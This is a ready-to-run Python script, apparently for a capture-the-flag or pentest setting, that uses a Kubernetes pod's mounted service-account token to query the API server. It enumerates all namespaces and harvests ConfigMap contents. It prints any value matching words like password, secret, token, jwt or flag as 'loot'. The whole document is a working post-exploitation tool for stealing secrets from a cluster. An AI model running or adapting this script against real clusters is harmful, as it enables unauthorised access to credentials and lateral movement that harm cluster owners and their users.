python3 - <<'EOF'
import os, sys, json, ssl, time
from urllib.request import Request, urlopen

# === CONFIGURATION ===
SA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount"
TOKEN_PATH = os.path.join(SA_PATH, "token")
CACERT_PATH = os.path.join(SA_PATH, "ca.crt")
APISERVER = "https://kubernetes.default.svc"

# === VISUALS ===
class C:
    G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; M = "\033[95m"; E = "\033[0m"
    BOLD = "\033[1m"

def section(title):
    print(f"\n{C.B}{'='*40}{C.E}")
    print(f"{C.B} {title}{C.E}")
    print(f"{C.B}{'='*40}{C.E}")
    time.sleep(0.5)

def info(msg):
    print(f"{C.C}[*] {msg}{C.E}")
    time.sleep(0.1)

def success(msg):
    print(f"{C.G}[+] {msg}{C.E}")
    time.sleep(0.1)

def fail(msg):
    print(f"{C.R}[-] {msg}{C.E}")

# === SETUP ===
if not os.path.exists(TOKEN_PATH):
    fail("FATAL: No Service Account found.")
    sys.exit(1)

with open(TOKEN_PATH) as f: TOKEN = f.read().strip()
with open(os.path.join(SA_PATH, "namespace")) as f: MY_NS = f.read().strip()
SSL_CTX = ssl.create_default_context(cafile=CACERT_PATH)

def k8s_api(path):
    url = f"{APISERVER}{path}"
    req = Request(url, headers={"Authorization": f"Bearer {TOKEN}"})
    try:
        with urlopen(req, context=SSL_CTX, timeout=3) as res:
            return json.loads(res.read())
    except Exception: return None

# === MAIN LOGIC ===
print(f"\n{C.M}   >>> K8s DYNAMIC ENUMERATOR v5.0 <<<{C.E}")
print(f"   Pod Namespace: {C.BOLD}{MY_NS}{C.E}")
time.sleep(1)

# --- 1. NAMESPACES ---
section("1. DISCOVERING TARGET NAMESPACES")
info(" querying API for namespace list...")

namespaces = []
resp = k8s_api("/api/v1/namespaces")

if resp and "items" in resp:
    namespaces = [item["metadata"]["name"] for item in resp["items"]]
    success(f"API Access Granted! Found {len(namespaces)} namespaces.")
else:
    fail("API Access Denied for namespace listing.")
    info("Falling back to local namespace only.")
    namespaces = [MY_NS]

print(f"\n   Targets identified: {C.Y}{', '.join(namespaces)}{C.E}")
time.sleep(1.5)

# --- 2. CONFIGMAP LOOTING ---
section("2. LOOTING CONFIGMAPS")
info("Scanning all identified namespaces for config data...")
time.sleep(1)

for ns in namespaces:
    print(f"\n{C.C}📂 Namespace: {ns}{C.E}")
    print(f"   {'-'*30}")
    
    # Try to fetch
    cm_resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
    
    if not cm_resp or "items" not in cm_resp:
        fail(f"Access Denied to ConfigMaps in '{ns}'")
        time.sleep(0.2)
        continue

    items = cm_resp['items']
    count = len(items)
    
    if count == 0:
        print(f"   (No ConfigMaps found)")
        continue

    success(f"Found {count} ConfigMaps! Analyzing content...")
    
    for cm in items:
        name = cm['metadata']['name']
        if name == "kube-root-ca.crt": continue 
        
        print(f"   > File: {C.BOLD}{name}{C.E}")
        
        if "data" in cm:
            for key, val in cm["data"].items():
                # Check for sensitive keywords
                keywords = ["flag", "pass", "key", "secret", "user", "admin", "token", "jwt", "auth"]
                is_sus = any(k in val.lower() or k in key.lower() for k in keywords)
                
                if is_sus:
                    print(f"     🚨 {C.G}POTENTIAL FLAG/SECRET FOUND ({key}):{C.E}")
                    print(f"{C.G}{'-'*20}{C.E}")
                    print(f"{val.strip()}")
                    print(f"{C.G}{'-'*20}{C.E}")
                    time.sleep(0.5) # Pause to let the user see the loot
                else:
                    preview = val[:60].replace('\n', ' ')
                    if len(val) > 60: preview += "..."
                    print(f"     - {key}: {preview}")
        else:
            print("     (No data keys)")
    
    time.sleep(0.5)

section("SCAN COMPLETE")
print(f"{C.G}Enumeration finished.{C.E}")
EOF
